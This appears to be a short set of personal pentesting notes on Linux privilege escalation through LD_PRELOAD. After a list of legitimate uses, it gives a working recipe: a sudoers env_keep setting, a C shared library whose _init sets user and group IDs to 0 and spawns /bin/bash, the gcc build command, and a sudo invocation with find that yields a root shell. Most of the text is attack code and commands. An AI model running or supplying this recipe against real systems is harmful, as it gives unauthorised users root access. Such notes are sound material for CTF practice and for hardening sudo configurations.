### Using LD_PRELOAD for priviledge escalation

Legit use-cases:
- Loading debugging tools
- Overriding functions for compatibility reasons
- Performance monitoring
- Testing and development
- Customizing behavior of applications without modifying their source code
- etc...

Ref: 

Basically we exploit the shared library loading mechanism of Linux. `.so` ext files can be loaded.

User must've some `sudo` rights
```shell
sudo -l
z97 ALL=(ALL) NOPASSWD: /usr/bin/find
# add `Defaults      env_keep=LD_PRELOAD` to the sudoers file
visudo
# or vi /etc/sudoers / etc...
# or check if it's already added `env_keep=LD_PRELOAD`
```

Add a C code file:
```c
#include <stdio.h>
#include <stdlib.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Build it:
```shell
touch evil.c
vi evil.c
gcc -fPIC -shared -o evil.so evil.c -nostartfiles
ls -al evil.so
sudo LD_PRELOAD=./evil.so find
# we in
whoami
id
```